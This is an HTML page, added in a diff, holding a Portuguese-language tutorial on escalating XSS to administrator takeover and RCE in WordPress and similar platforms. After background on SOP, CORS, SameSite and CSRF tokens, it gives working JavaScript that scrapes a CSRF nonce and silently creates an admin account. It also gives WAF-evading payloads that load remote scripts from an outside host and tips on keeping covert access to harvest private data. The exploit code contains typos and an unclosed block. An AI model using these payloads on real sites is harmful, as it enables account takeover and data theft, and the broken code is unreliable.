@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elevating Low Vulnerabilities to Critical in CMSs and E-Commerce Platforms</title>
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <style>
+        pre {
+            padding: 10px;
+            background-color: #111111;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        body {
+            line-height: 1.6;
+            max-width: 1500px;
+            margin: 0 auto;
+            padding: 20px;
+            cursor: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ccc;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #2a2a2a;
+        }
+    </style>
+</head>
+
+<body>
+    <script type="text/javascript" src="/js/app.js"></script>
+
+    <hr>
+    <center>
+        <h2>Elevating Low Vulnerabilities to Critical in CMSs and E-Commerce Platforms</h2>
+    </center>
+    <hr>
+
+    <br>
+    <div class="papers">
+        <b>Cross-site Scripting (XSS)</b> é uma das vulnerabilidades mais comuns encontradas em ataques a aplicações
+        web.
+        Devido à
+        sua ampla presença na maioria das aplicações, muitas vezes seu potencial é subestimado, limitando-se apenas a
+        <i>Sessions Hijacking</i>, <i>Open Redirects</i>, <i>Phishings</i>, entre outros. No entanto, em certos
+        cenários, é
+        possível comprometer
+        totalmente os sistemas ao explorar essa falha de maneira eficaz.
+
+        <br><br>
+        Neste artigo, demonstrarei o real potencial do <b>Cross-Site Scripting (XSS)</b> em plataformas de <b>Content
+            Management
+            Systems (CMS)</b> e <b>E-Commerce</b>, além de explorar como é possível alcançar a <b>Execução Remota de
+            Código
+            (RCE)</b>
+        por meio de <b>XSS</b> nesses sistemas.
+
+        <br><br>
+        Porém antes de prosseguirmos, é fundamental compreender os conceitos básicos de <b>Cross-Site Scripting
+            (XSS)</b>,
+        Atributos de cookies <b>(HttpOnly, SameSite)</b>, <b>Same-Origin Policy (SOP)</b>, <b>Cross-Origin Resource
+            Sharing
+            (CORS)</b>, <b>Tokens
+            CSRF</b>, entre outros. Caso já esteja familiarizado ou queira avançar diretamente para o conteúdo do
+        <b>POST</b> <a href="#\">(Clique aqui)</a><b></b>.
+
+        <br><br><br>
+
+        <h2>O que é Cross-Site Scripting (XSS)</h2>
+        <b>Cross-Site Scripting (XSS)</b> é uma vulnerabilidade que permite a inserção de códigos <b>JavaScript</b> em
+        uma aplicação.
+        Esses códigos são interpretados pelo navegador do usuário, possibilitando o acesso a informações da aplicação
+        vulnerável ao qual o usuário está navegando, como cookies de sessão, credenciais armazenadas, entre outros.
+        Permitindo que um atacante execute ações em nome de um usuário legítimo, contornando as políticas de
+        <b>Same-Origin
+            Policy (SOP)</b> implementadas nos navegadores web.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110001.png" width="800" height="500"></center>
+        <br><br>
+
+        <h2>O que é Same-Origin Policy (SOP)</h2>
+        <b>Same-Origin Policy (SOP)</b> é um mecanismo de defesa implementado em todos os navegadores por padrão. Sua
+        função é
+        não permitir a <b>LEITURA</b> de requisições enviadas <i>Cross-Origin</i>, ou seja, requisições que não sejam da
+        mesma origem.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110010.png" width="570" height="300"></center>
+        <br><br>
+
+        No contexto da web, uma origem pode ser resumida da seguinte forma:
+        <table>
+            <thead>
+                <tr>
+                    <th>URL</th>
+                    <th>Outcome</th>
+                    <th>Reason</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>http://store.company.com/dir2/other.html</td>
+                    <td>Same origin</td>
+                    <td>Only the path differs</td>
+                </tr>
+                <tr>
+                    <td>http://store.company.com/dir/inner/another.html</td>
+                    <td>Same origin</td>
+                    <td>Only the path differs</td>
+                </tr>
+                <tr>
+                    <td>https://store.company.com/page.html</td>
+                    <td>Failure</td>
+                    <td>Different protocol</td>
+                </tr>
+                <tr>
+                    <td>http://store.company.com:81/dir/page.html</td>
+                    <td>Failure</td>
+                    <td>Different port (http:// is port 80 by default)</td>
+                </tr>
+                <tr>
+                    <td>http://news.company.com/dir/page.html</td>
+                    <td>Failure</td>
+                    <td>Different host</td>
+                </tr>
+            </tbody>
+        </table>
+
+        fonte: <a
+            href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy></a>
+
+        <br><br>
+        Para que um site seja considerado <i>Same-Origin</i>, seus <i>schemas</i> <b>HTTP</b> precisam ser
+        idênticos, ou seja,
+        devem possuir a mesma estrutura de <b>(SCHEMA://HOST:PORT/)</b>, tendo flexibilidade apenas no quesito de
+        diretórios e arquivos.<br><br>
+
+        Como mencionado anteriormente, o <b>Same-Origin Policy (SOP)</b> bloqueia apenas a leitura das respostas de
+        requisições de origens diferentes <i>(Cross-Origin)</i>. Isso significa que ainda é viável enviar
+        requisições
+        autenticadas utilizando <b>JavaScript</b>, fazendo-se passar pelo usuário legítimo através de um site de
+        Origem
+        Diferente, em uma técnica conhecida como <b>Cross-Site Request Forgery (CSRF)</b>. Abaixo, veremos mais
+        informações sobre.
+
+        <br><br><br>
+
+        <h2>Cross-Site Request Forgery (CSRF)</h2>
+        <b>Cross-Site Request Forgery (CSRF)</b> envolve a execução de ações em nome do usuário por meio de códigos
+        <b>HTML</b> ou
+        <b>JavaScript</b> através de origens diferentes <i>(Cross-Origin)</i>. No entanto, como veremos, existem
+        diversos mecanismos
+        que podem bloquear a exploração do <b>CSRF</b>. Apesar disso, este ataque é extremamente poderoso e, em certos
+        cenários, pode ser mais prejudicial do que um <b>Cross-Site Scripting (XSS)</b>, já que não requer uma falha no
+        código
+        da aplicação em si. Além disso, é facilmente disseminado entre os usuários simplesmente ao acessar um simples
+        site.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110011.png" width="800" height="580"></center>
+        <br><br>
+
+        <h2>SameSite Cookie Attribute</h2>
+        <b>SameSite</b> é um mecanismo de segurança dos cookies que sua principal funcionalidade é bloquear ou permitir
+        o envio
+        de cookies apartir de requisições de origens diferentes <i>(Cross-Origin)</i>. Esse atributo possue <b>3</b>
+        categorias:
+        <ul>
+            <li><b>None</b>: Permite o envio de cookies de origens diferentes tanto em requisições <b>GET</b> quanto em
+                requisições
+                <b>POST</b>. Isso significa que, se os atributos de cookies do seu site estiverem configurados com o
+                atributo
+                <b>“SameSite: None”</b>, e um usuário com uma sessão estabelecida no site alvo visitar outro site
+                malicioso
+                de
+                origem diferente <i>(Cross-Origin)</i>, o site malicioso pode realizar requisições <b>GET</b> e
+                <b>POST</b> para o
+                site
+                alvo em nome da vítima através de <b>JavaScript</b>.
+            </li>
+            <li><b>Lax</b>: Permite o envio de cookies de origens diferentes apenas em requisições que utilizam o método
+                <b>GET</b>.
+                Isso significa que, se os atributos de cookies do seu site estiverem configurados com o atributo
+                <b>"SameSite:
+                    Lax"</b>, ou caso o atributo <b>SameSite</b> não seja especificado pelo desenvolvedor da aplicação
+                durante a
+                atribuição do cookie, o cookie automaticamente recebe o atributo <b>"SameSite: Lax"</b> em navegadores
+                <b>Chrome</b>.
+                Nesse cenário, se um usuário com uma sessão estabelecida no site alvo visitar outro site malicioso de
+                origem
+                diferente <i>(Cross-Origin)</i>, o site malicioso pode realizar requisições <b>GET</b> para o site alvo
+                em nome
+                da
+                vítima através de <b>JavaScript</b>.
+            </li>
+            <li><b>Strict</b>: Bloqueia completamente o envio de cookies de origens diferentes <i>(Cross-Origin)</i>,
+                sendo o
+                cenário
+                mais restritivo.</li>
+        </ul>
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110100.png"></center>
+        <br>
+
+        No entanto, como mencionado anteriormente, o site malicioso não pode visualizar as respostas de suas requisições
+        devido ao mecanismo de <b>Same-Origin Policy (SOP)</b>. Entretanto, existe um mecanismo de configuração do
+        <b>SOP</b> chamado
+        <b>Cross-Origin Resource Sharing (CORS)</b>. Se configurado de maneira incorreta, <b>CORS</b> pode invalidar o
+        <b>SOP</b>,
+        tornando-se um vetor de exploração.
+
+        <br><br><br>
+        <h2>Cross-Origin Resource Sharing (CORS)</h2>
+        O <b>Cross-Origin Resource Sharing (CORS)</b> é um mecanismo de configuração do <b>Same-Origin Policy (SOP)</b>.
+        Em outras
+        palavras, o <b>CORS</b> permite que o desenvolvedor "enfraqueça" as regras restritivas do <b>SOP</b>. Você pode
+        estar se
+        perguntando, por que um desenvolvedor faria isso?. A resposta é simples. Alguns serviços, como provedores e
+        <b>APIs</b>, necessitam que o cliente (usuário) receba e veja a resposta de sua requisição, isso só é viável
+        através do
+        <b>CORS</b>.
+
+        <br><br>
+        O <b>CORS</b> possue vários cabeçalhos <i>(headers)</i> de configuração:
+        <ul>
+            <li><b>Access-Control-Allow-Origin;</b></li>
+            <li><b>Access-Control-Expose-Headers;</b></li>
+            <li><b>Access-Control-Max-Age;</b></li>
+            <li><b>Access-Control-Allow-Credentials;</b></li>
+            <li><b>Access-Control-Allow-Methods;</b> e</li>
+            <li><b>Access-Control-Allow-Headers</b>.</li>
+        </ul>
+
+        Porém os mais utilizados são:
+        <ul>
+            <li><b>Access-Control-Allow-Origin;</b> e</li>
+            <li><b>Access-Control-Allow-Credentials</b>.</li>
+        </ul>
+
+        <br>
+        O <i>header</i> <b>"Access-Control-Allow-Origin"</b> é um componente essencial do <b>CORS</b> que determina
+        quais sites <i>Cross-Origin</i>
+        possuem permissão para acessar as respostas das requisições. No entanto, por padrão, ao apenas especificar o
+        <i>header</i> <b>"Access-Control-Allow-Origin"</b> as respostas das requisições são retornadas de forma não
+        autenticada.<br><br>
+
+        Isso
+        significa que, mesmo que o usuário realize requisições de forma autenticada <i>Cross-Origin</i>, seja através
+        dos
+        atributos <b>SameSite “Lax”</b> ou </b>“None”</b>, a resposta da requisição enviada de volta para o usuário será
+        tratada como
+        se o usuário não estivesse autenticado. No entanto, sabemos que essa não é a realidade. É aqui que o
+        <i>header</i>
+        <b>"Access-Control-Allow-Credentials"</b> entra em jogo.
+
+        <br><br>
+
+        O <i>header</i> <b>"Access-Control-Allow-Credentials"</b> é um componente do <b>CORS</b> que determina se as
+        respostas das
+        requisições <i>Cross-Origin</i>, especificadas pelo <i>header</i> <b>"Access-Control-Allow-Origin"</b>, serão
+        enviadas ao usuário de
+        forma autenticada ou não autenticada. Este <i>header</i> possui dois atributos: <b>"true"</b> e
+        <b>"false"</b>.<br><br>
+
+        Quando o atributo é
+        definido como <b>"true"</b>, as respostas das requisições são enviadas ao usuário de forma autenticada. Por
+        outro lado,
+        quando o atributo é definido como <b>"false"</b>, ou caso o <i>header</i>
+        <b>"Access-Control-Allow-Credentials"</b> não seja
+        especificado, as respostas das requisições são retornadas ao usuário de forma não autenticada.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110101.png"></center>
+        <br><br>
+
+        <h2>CSRF Tokens</h2>
+        Os <b>CSRF Tokens</b> são valores randômicos gerados e validados pelo servidor a cada requisição enviada para a
+        aplicação. Sua principal função é mitigar os ataques de <b>Cross-Site Request Forgery (CSRF)</b>, uma vez que,
+        através
+        de um <b>CSRF</b>, não é viável obter a resposta da aplicação (a menos que o <b>CORS</b> esteja mal configurado,
+        como visto
+        anteriormente).
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110110.png" width="900" height="600"></center>
+        <br><br>
+
+        <h2>HttpOnly Cookie Attribute</h2>
+        Por último, mas não menos importante, o atributo <b>HttpOnly</b> é um mecanismo crucial que impede a leitura do
+        valor
+        dos cookies de sessão, mesmo quando o script está sendo executado na mesma origem <i>(Same-Origin)</i> ou em
+        origens
+        diferentes <i>(Cross-Origin)</i>. Embora isso seja eficaz em proteger os cookies de sessão, ainda é viável
+        realizar
+        requisições em nome do usuário.
+
+        <br><br><br>
+
+        <h2 id="\">XSS to RCE Explanation</h2>
+
+        A maioria dos <b>CMS’s</b> e plataformas de <b>E-Commerce’s</b> implementam mecanismos de defesa robustos contra
+        ataques de
+        <b>Cross-Site Request Forgery (CSRF)</b>. No entanto, muitas vezes, não é aplicado o mesmo nível de proteção ou
+        pode
+        ser difícil mitigar os ataques de <b>Cross-Site Scripting (XSS)</b>. O perigo reside no fato de que
+        compreendemos a
+        estrutura dessas aplicações, incluindo sua construção interna, fluxo de requisições, entre outros aspectos,
+        especialmente devido ao fato de serem de código aberto <i>(Open Source)</i>. Com esse conhecimento em mãos e a
+        capacidade de executar <b>JavaScript</b> na mesma origem <i>(Same-Origin)</i> da aplicação, seja através de
+        plugins, temas
+        vulneráveis ou falhas no núcleo da aplicação <i>(core)</i>, é viável causar impactos significativos, resultando
+        em
+        <b>Execução Remota de Códigos (RCE)</b> nesses sistemas. Tendo como grande aliado a execução de
+        <b>JavaScript</b> na mesma
+        origem <i>(Same-Origin)</i>, contornando os bloqueios de <b>CSRF Tokens</b>, <b>Same-Origin Policy (SOP)</b>,
+        <b>SameSite</b>, entre outros,
+        tendo apenas como um desafio em alguns casos o atributo <b>HttpOnly</b>. No entanto, como sabemos, mesmo não
+        possuindo
+        acesso aos cookies de sessão do usuário, podemos realizar requisições normalmente para a aplicação, passando-se
+        pelo usuário, mesmo na presença do atributo <b>HttpOnly</b>.
+        <br><br>
+        Essas possibilidades de <b>Execução Remota de Códigos (RCE)</b> são agravadas pelo fato de que esses sistemas
+        possuem
+        diversas interfaces de gerenciamento tanto a nível de aplicação quanto de servidor. Embora muitas empresas não
+        considerem isso um risco, pois essas interfaces são geralmente acessadas apenas com privilégios elevados
+        (usuários administrativos), na realidade, isso cria cenários perfeitos para o comprometimento desses servidores
+        através de falhas como <b>Cross-Site Scripting (XSS)</b>. A complexidade desses sistemas oferece várias
+        oportunidades
+        para explorar e criar ataques sofisticados. Mais detalhes sobre essas cadeias de ataques serão abordados a
+        seguir.
+
+        <br><br>
+        <h2>Building the Exploits</h2>
+        Primeiro, precisamos escolher um serviço. Esse serviço pode ser um projeto de código aberto <i>(Open Source)</i>
+        ou até
+        mesmo sistemas privados. Muitas vezes, ao ler os arquivos <b>JavaScript</b> da aplicação, é viável entender seu
+        funcionamento, suas funcionalidades e características interessantes, e criar seus exploits com base nisso. Já
+        desenvolvi exploits para serviços privados, mas, por serem privados, não tenho permissão para divulgá-los. Porém
+        todos foram através de leitura de arquivos <b>JavaScript</b>, entendendo as lógicas da aplicação que são
+        executadas de
+        forma autenticada, e escrevendo exploits a partir desses arquivos. Ou seja, não hesite em tentar entender a
+        lógica da aplicação por meio de códigos <b>JavaScript</b>, pois isso pode ser uma mina de ouro em determinados
+        ambientes. Para este exemplo, vamos criar um exploit para o <b>Wordpress</b>. Antes de tudo, precisamos de uma
+        instância do <b>Wordpress</b> atualizada e estável, que funcione sem problemas. Durante minhas pesquisas,
+        utilizei as
+        imagens <b>Docker</b> da <b>Bitnami</b>, que também vamos usar neste exemplo.
+        <br><br>
+        Podemos baixar a última imagem <b>Docker</b> do <b>Wordpress</b> disponível através do site da <b>Bitnami</b>
+        <a href="https://bitnami.com/stack/wordpress/containers">(bitnami.com/stack/wordpress/containers)</a>, ou
+        diretamente através do comando:
+        <pre>curl -sSL https://raw.githubusercontent.com/bitnami/containers/main/bitnami/wordpress/docker-compose.yml > docker-compose.yml</></pre>
+        <br><br>
+        Após realizar o download do arquivo <b>“docker-compose.yml”</b>, vamos implantar nossa aplicação utilizando o
+        comando:
+        <pre><code>docker-compose up</code></pre>
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110111.png" width="1450" height="450"></center>
+        <br><br>
+
+        Depois que a aplicação for implantada com sucesso, iremos autenticar usando um usuário com permissões para
+        realizar operações interessantes. No caso do Wordpress, este usuário seria o administrador. As credenciais
+        padrão de administrador do <b>Wordpress Bitnami</b> são:<br><br>
+
+        <center>
+            <code>
+                <h3>
+                    Username: user<br>
+                    Password: bitnami
+                </h3>
+            </code>
+        </center>
+
+        <br>
+        Depois de nos autenticarmos, é crucial navegar pelo sistema e procurar por funcionalidades interessantes que
+        possam nos conceder <b>Execução Remota de Código (RCE)</b> ou acessos privilegiados. No caso do
+        <b>Wordpress</b>, podemos
+        alcançar esse objetivo explorando plugins personalizados instalados que possam ter vulnerabilidades
+        autenticadas, alterar os privilégios do nosso usuário, adicionar uma nova conta de usuário com privilégios
+        administrativos, editar plugins <i>built-in</i> do próprio <b>Wordpress</b>, editar temas <i>built-in</i> do
+        <b>Wordpress</b>, explorar
+        vulnerabilidades autenticadas no próprio <i>core</i> do <b>Wordpress</b>, entre outras possibilidades.
+
+        <br><br>
+        Para este exemplo, vamos criar uma conta com privilégios administrativos. A partir dessa conta, poderemos
+        navegar pela aplicação através da interface gráfica em busca de outros vetores que nos permitam ampliar nossos
+        acessos e obter <b>RCE</b> no servidor. Em sistemas privados, poderíamos adicionar uma conta administrativa,
+        manter o
+        acesso e coletar o máximo de informações, como: conversas no <b>WhatsApp</b>, trocas de e-mails através da
+        aplicação,
+        logs do sistema, entre outros. Enquanto nossa conta estiver ativa.
+
+        <br><br>
+        Em nosso ambiente de laboratório <b>Docker</b> do <b>Wordpress</b>, estamos logados como o usuário administrador
+        <b>(user)</b>, onde
+        iremos explorar as funcionalidades de adicionar novos usuários no menu <b>"Users"</b>.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00111000.png"></center>
+        <br>
+
+        A abordagem que utilizo se resume em realizar todo o fluxo de uma funcionalidade interessante, capturando as
+        requisições feitas à aplicação e analisando cada uma detalhadamente. Para demonstração vamos aplicar isso à
+        funcionalidade de adicionar usuários.
+
+        <br><br>
+        <h3>(1) Criando um novo usuário administrador na aplicação</h3>
+
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00111001.png"></center>
+        <br>
+
+        <h3>(2) Usuário adicionado com sucesso</h3>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110000.png"></center>
+        <br>
+
+        Depois de completar o processo de adicionar um usuário, podemos revisar as requisições realizadas durante esse
+        processo. As requisições marcadas em vermelho são aquelas que precisamos nos aprofundar e replicar seus
+        comportamentos em nosso exploit.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110001.png" width="1450"></center>
+        <br>
+
+        A primeira requisição <b>(324)</b>, realiza um <b>GET</b> para o arquivo <b>"/wp-admin/user-new.php"</b> e obtém
+        o <b>CSRF Token
+            “50bee24cef”</b>. Guarde esse token, pois ele será utilizado nas próximas requisições.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110010.png" width="1420"></center>
+        <br>
+
+        Através do navegador, o usuário preenche os campos com as informações da conta que deseja adicionar. Ao final,
+        uma requisição é feita para a aplicação contendo esses dados. No nosso caso, é realizada uma requisição <b>POST
+            (335)</b> para o arquivo <b>"/wp-admin/user-new.php"</b>, contendo os parâmetros das informações do usuário
+        <i>(user_login,
+            email, pass1, pass2, role, pw_weak)</i>, juntamente com o <b>CSRF Token “_wpnonce_create-user”</b>.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110011.png" width="1410"></center>
+        <br>
+
+        No entanto, é importante estar atento, ao tentarmos realizar novamente a mesma requisição para a aplicação,
+        recebemos uma resposta completamente diferente. Isso pode significar duas coisas: primeiro, que nosso <b>CSRF
+            Token</b>
+        expirou e precisamos gerar um novo, realizando uma nova requisição <b>GET</b> para
+        <b>"/wp-admin/user-new.php"</b>. Segundo,
+        pode ser que já exista um usuário cadastrado com as mesmas informações do usuário que estamos tentando
+        cadastrar.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110100.png" width="1410"></center>
+        <br>
+
+        Através da funcionalidade de renderização de <b>HTML</b> do <b>Burp Suite</b> <i>"render"</i>, é viável observar
+        que já existe um
+        usuário registrado na aplicação com nosso e-mail e nome de usuário. É crucial estar atento a essas situações,
+        pois ao desenvolver exploits mais complexos, você precisará estar preparado para lidar com problemas como este.
+        Lembre-se de que, na maioria dos casos, só teremos uma chance de executar nosso exploit.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110101.png" width="1410"></center>
+        <br>
+
+        Aqui identificamos um padrão. Se a aplicação responde com o código de status <b>"302 Found"</b> e retornar um
+        <i>Location</i>
+        para <b>"users.php?update=add&id={ID}"</b>, significa que nosso usuário foi adicionado com sucesso. Por outro
+        lado, se
+        a aplicação responde com o código de status <b>"200 OK"</b> e retorna um código <b>HTML</b> contendo a string
+        <i>"already
+            registered"</i>, isso indica que ocorreu algum erro e nosso usuário não foi adicionado.
+
+        <br><br>
+        Na última etapa do nosso fluxo para adicionar um usuário na aplicação, é realizada uma requisição <b>GET</b>
+        para o
+        arquivo <b>"/wp-admin/users.php?update=add&id={ID}" (336)</b>, conforme especificado pela aplicação no cabeçalho
+        <i>Location</i>. Ao usar novamente a funcionalidade de renderização de <b>HTML</b> do <b>Burp Suite</b>, podemos
+        confirmar que nosso
+        usuário foi adicionado com sucesso. No entanto, mais importante para o nosso exploit, temos dois campos que
+        podemos verificar para validar se o usuário foi realmente adicionado. Primeiro, através da mensagem <i>"New user
+            created"</i>. Segundo, e mais confiável, pesquisando pelo nome ou e-mail do nosso usuário, fazendo uma
+        requisição
+        para o arquivo <b>"/wp-admin/users.php"</b>.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110110.png" width="1450"></center>
+        <br>
+
+        Vamos recapitular nossos passos. Primeiro, precisamos realizar uma requisição <b>GET</b> para o arquivo
+        <b>"/wp-admin/user-new.php"</b> e extrair o <b>CSRF Token</b> de sua resposta <b>HTML</b>. Em seguida, faremos
+        uma requisição <b>POST</b>
+        para o arquivo <b>"/wp-admin/user-new.php"</b>, passando como parâmetros o <b>CSRF Token</b> extraído
+        <b>"_wp_nonce_create-user"</b>
+        e as informações da conta de usuário que queremos adicionar na aplicação <i>(user_login, email, pass1, pass2,
+            role,
+            pw_weak)</i>. Após recebermos a resposta dessa requisição <b>POST</b>, verificaremos se obtivemos o código
+        de status <b>"302
+            Found"</b> e se o cabeçalho <i>"Location"</i> contém a string
+        <b>"/wp-admin/users.php?update=add&id={ID}"</b>. Em seguida,
+        acessaremos a <b>URL</b> do <i>Location</i> e verificaremos se as informações do nosso usuário foram adicionadas
+        com sucesso,
+        procurando pela string <b>"New User created"</b> ou, de forma mais confiável, pelas informações da nossa conta
+        adicionada, como username ou e-mail.
+
+        <br><br>
+
+        Agora que entendemos todo o fluxo de como ocorre a criação de um usuário e os possíveis problemas que podem
+        surgir no processo, chegou a hora da diversão: criar nosso exploit. Fique à vontade para usar qualquer método de
+        realização e manipulação de requisições (<b>Fetch</b>, <b>XMLHTTPRequest</b>, <b>JQuery</b>, <b>Axios</b>,
+        etc.). Neste exemplo, irei
+        utilizar <b>XMLHTTPRequest</b>.
+
+        <br><br>
+
+        Como podemos observar, em apenas <b>28</b> linhas de código, conseguimos realizar toda a cadeia de ataque. No
+        entanto,
+        é importante notar que este código é apenas uma demonstração. Ele não possui tratamento de erros nem
+        <i>callbacks</i>
+        para informar se a exploração foi bem-sucedida. Em um cenário real, você precisará escrever um exploit mais
+        elaborado. No entanto, para entender a lógica básica por trás da exploração, este código já é suficiente.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110111.png"></center>
+        <br>
+
+        <center>code snippet</center>
+        <pre><code>
+// Make a GET request to "/wp-admin/user-new.php".
+var stage1 = new XMLHttpRequest();
+stage1.open("GET", "https://wordpress.local/wp-admin/user-new.php", false);
+stage1.send();
+
+// Grep the CSRF Token value.
+var csrf_token = stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];
+
+// Make a POST request to "/wp-admin/user-new.php".
+var stage2 = new XMLHttpRequest();
+stage2.open("POST", "https://wordpress.local/wp-admin/user-new.php", false);
+stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlend');
+stage2.send("action=createuser&_wpnonce_create-user=" +
+    csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
+    "nowak0x01" + "&email=" +
+    enURIComponent("nowak0x01@wordpress.local") + "&first_name=" +
+    "" + "&last_name=" +
+    "" + "&url=&pass1=" +
+    enURIComponent("P0C#$u37") + "&pass2=" +
+    enURIComponent("P0C#$u37") + "&pw_weak=on&role=" +
+    "administrator" + "&createuser=Add%2BNew%2BUser");
+
+// Check in the HTML  if it contains the username of our user "nowak0x01".
+if (stage2.responseText.match("nowak0x01")[0]) {
+
+console.log("The user has been successfully created!");
+
+</code></pre>
+
+        <br>
+
+        Para fins de demonstração, criamos um arquivo <b>"searcher.php"</b> no diretório do <b>Wordpress</b> vulnerável
+        a <b>Cross-Site
+            Scripting (XSS)</b>. No entanto, em um cenário real, você precisará explorar uma vulnerabilidade de
+        <b>XSS</b> genuína.
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100111000.png"></center>
+        <br>
+
+        <br><br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100111001.png"></center>
+        <br>
+
+        A partir desse <b>XSS</b>, agora precisamos importar nosso exploit. Isso pode ser feito de várias maneiras. A
+        mais
+        comum é através da tag:<br><br>
+
+        <center>
+            <pre><code>&lt;script src=""&gt;&lt;/script&gt;</code></pre>
+        </center>
+
+        <br>
+        No entanto, essa abordagem geralmente é bloqueada por <b>WAFs</b>. Existem outras técnicas menos conhecidas para
+        importar arquivos <b>JavaScript</b>, que podem ajudar a contornar alguns cenários de <b>WAFs</b>. Uma delas é
+        através das tags:<br><br>
+
+        <center>
+            <pre><code>&lt;img src/onerror=import('http:example.com')&gt;
+                &lt;img src/onerror=s=document.createElement('script');s.src='http://example.com/X.js';document.body.appendChild(s)&gt;</code></pre>
+        </center>
+
+        <br>
+        Ou se a aplicação estiver utilizando <b>jQuery</b>, também podemos usar:
+
+        <center>
+            <pre><code>$.getScript('http:example.com')</code></pre>
+        </center>
+
+        <br><br>
+        Agora que temos diversas maneiras de importar nossos scripts, vamos importar nosso exploit <b>"AddUser.js"</b>.
+
+        <br><br>
+        Sinta-se à vontade para hospedar seu exploit em qualquer domínio, <b>VPS</b>, através da própria aplicação via
+        <b>File
+            Upload</b>, etc. No nosso caso, utilizamos o <b>GCP</b> para hospedar nosso arquivo <b>"AddUser.js"</b> em
+        um servidor.
+
+        <br><br>
+        <a style="color:red">Nota: Se a aplicação estiver usando <b>HTTPS</b>, o seu servidor, onde o exploit está
+            hospedado, também precisa
+            utilizar <b>HTTPS</b>. Caso contrário, você receberá o seguinte erro:</a>
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110000.png" width="1500"></center>
+        <br><br>
+
+        Depois de hospedarmos nosso exploit, precisamos importá-lo na aplicação através do <b>XSS</b>. No caso,
+        utilizamos a
+        abordagem tradicional <code>&lt;script src=""&gt;&lt;/script&gt;</code>, com o seguinte payload:
+        <code>https://wordpress.local/searcher.php?search=&lt;script src="https://34.125.48.153/AddUser.js"&gt;</script>
+        </code>
+
+        <br><br>
+        Aplicação solicitando nosso exploit <b>"AddUser.js"</b>.
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110001.png" width="1500"></center>
+        <br><br>
+
+        Após um usuário com sessão administrativa no <b>Wordpress</b> acessa nossa <b>URL</b> vulnerável, que está
+        importando nosso
+        exploit, nossa cadeia de ataque é executada. Isso resulta na realização das requisições necessárias para criar o
+        nosso usuário <b>“nowak0x01”</b> administrador na aplicação.
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110010.png" width="1500"></center>
+        <br><br>
+
+        Onde nosso usuário foi adicionado com sucesso à aplicação.
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110011.png"></center>
+        <br><br>
+
+        Após isso, podemos realizar login na aplicação com nosso novo usuário adicionado e explorar outros vetores de
+        <b>Execução Remota de Códigos (RCE)</b> ou funcionalidades interessantes, como mencionado anteriormente. No
+        entanto,
+        vamos abordar isso de uma maneira mais interessante.
+
+        <br>
+        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110100.png"></center>
+        <br>
+
+        <center<img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110101.png" width="1400">
+            </center>
+            <br>
+
+            Concordamos que adicionar um usuário, especialmente com privilégios de administrador, em um <b>WordPress</b>
+            ou
+            qualquer sistema, pode levantar suspeitas. Aqui é onde a verdadeira magia do <b>XSS</b> entra em jogo; você
+            só
+            precisa
+            ser criativo. Sabemos que desenvolver exploits pode ser um pouco trabalhoso, e às vezes, não temos tempo
+            para
+            nos dedicar a escrever um exploit que demonstre todo o impacto que uma vulnerabilidade pode ter no ambiente
+            do
+            cliente. Por esse motivo, desenvolvi exploits para os <b>CMS’s</b> e plataformas de <b>E-Commerce’s</b> mais
+            populares e
+            amplamente utilizados. Estes exploits incluem diversos módulos, tais como:
+
+            <ul>
+                <li><b>(Privilege Escalation)</b> - <i>Creates an administrator user on the application</i>;</li>
+                <li><b>(RCE)</b> - <i>Built-In Plugin’s Edit</i>;</li>
